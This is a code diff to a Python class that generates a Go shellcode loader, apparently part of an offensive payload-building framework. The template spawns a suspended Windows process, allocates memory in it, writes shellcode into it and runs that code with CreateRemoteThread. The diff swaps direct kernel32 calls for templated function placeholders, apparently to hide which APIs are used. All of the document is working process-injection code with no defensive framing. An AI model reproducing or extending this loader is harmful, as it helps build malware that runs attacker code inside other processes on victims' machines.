@@ -12,7 +12,7 @@ class spawnandinject:
 
     def imports(self) -> list[str]:
         return ['golang.org/x/sys/windows',
-                'syscall']
+                'unsafe']
 
     def compilerOptions(self) -> list[str]:
         return ["golang.org/x/sys/windows"]
@@ -24,28 +24,19 @@ class spawnandinject:
         return Template("""
     {transformers}
 
-	// Load DLLs and Procedures
-	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
-
-    VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
-    CreateRemoteThread := kernel32.NewProc("CreateRemoteThread")
-    WaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
-    CloseHandle := kernel32.NewProc("CloseHandle")
-
 	procInfo := &windows.ProcessInformation{{}}
 	startupInfo := &windows.StartupInfo{{
 		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
 		ShowWindow: 1,
 	}}
-	windows.CreateProcess(nil, syscall.StringToUTF16Ptr("$target"), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
+    target := []byte("$target");
+	{CreateProcessA}(0, uintptr(unsafe.Pointer(&target[0])), 0, 0, 1, windows.CREATE_SUSPENDED, 0, 0, uintptr(unsafe.Pointer(startupInfo)), uintptr(unsafe.Pointer(procInfo)))
+	addr, _, _ := {VirtualAllocEx}(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.$memoryPermission)
+    _, _, _ = {WriteProcessMemory}(uintptr(procInfo.Process), addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), 0)
     
-	addr, _, _ := VirtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE), uintptr(windows.$memoryPermission))
+    thread, _, _ := {CreateRemoteThread}(uintptr(procInfo.Process), 0, 0, addr, 0, 0, 0)
     
-    _ = windows.WriteProcessMemory(procInfo.Process, addr, &shellcode[0], uintptr(len(shellcode)), nil)
-    
-    thread, _, _ := CreateRemoteThread.Call(uintptr(procInfo.Process), 0, uintptr(0), addr, uintptr(0), 0, uintptr(0))
-    
-	WaitForSingleObject.Call(thread, 500)
+	{WaitForSingleObject}(thread, 500)
 	
-    CloseHandle.Call(thread);
+    {CloseHandle}(thread);
 """).substitute(target=self.target, memoryPermission=self.memoryPermission)
